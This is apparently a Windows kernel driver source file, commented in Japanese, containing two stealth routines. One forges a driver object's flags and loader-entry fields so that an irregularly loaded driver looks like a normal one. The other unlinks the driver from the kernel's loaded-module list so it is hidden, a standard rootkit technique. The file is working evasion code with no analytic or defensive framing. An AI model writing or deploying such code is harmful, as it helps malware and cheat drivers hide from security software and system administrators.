#include <ntifs.h>
#include <ntimage.h>
#include "Harden.h"

static ULONG PeField(PVOID base, BOOLEAN wantSize)
{
    __try {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PUCHAR)base + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
        return wantSize ? nt->OptionalHeader.SizeOfImage
                        : nt->OptionalHeader.AddressOfEntryPoint;
    } __except (EXCEPTION_EXECUTE_HANDLER) { return 0; }
}

VOID HardenDriverObject(PDRIVER_OBJECT drv)
{
    if (!drv) return;

    /* 1) 通常ドライバが必ず持っているフラグ */
    drv->Flags |= DRVO_INITIALIZED | DRVO_BOOTINIT_DONE;

    /* 2) DriverSection (LDR_DATA_TABLE_ENTRY) を正規化 */
    if (drv->DriverSection && drv->DriverStart) {
        PLDR_DATA_TABLE_ENTRY e = (PLDR_DATA_TABLE_ENTRY)drv->DriverSection;

        if (e->SizeOfImage == 0) e->SizeOfImage = PeField(drv->DriverStart, TRUE);
        if (e->DllBase      == NULL) e->DllBase = drv->DriverStart;
        if (e->EntryPoint   == NULL) {
            ULONG rva = PeField(drv->DriverStart, FALSE);
            if (rva) e->EntryPoint = (PVOID)((PUCHAR)drv->DriverStart + rva);
        }
        e->Flags |= 0x20;                 /* 通常ドライバが持つビット */
        if (e->LoadCount == 0) e->LoadCount = 1;
    }

    /* 3) イメージサイズを確定 */
    if (drv->DriverSize == 0 && drv->DriverStart)
        drv->DriverSize = PeField(drv->DriverStart, TRUE);
}

VOID HideFromModuleList(PDRIVER_OBJECT drv)
{
    if (!drv->DriverSection) return;
    PLDR_DATA_TABLE_ENTRY e = (PLDR_DATA_TABLE_ENTRY)drv->DriverSection;
    RemoveEntryList(&e->InLoadOrderLinks);
    e->InLoadOrderLinks.Flink = &e->InLoadOrderLinks;
    e->InLoadOrderLinks.Blink = &e->InLoadOrderLinks;
}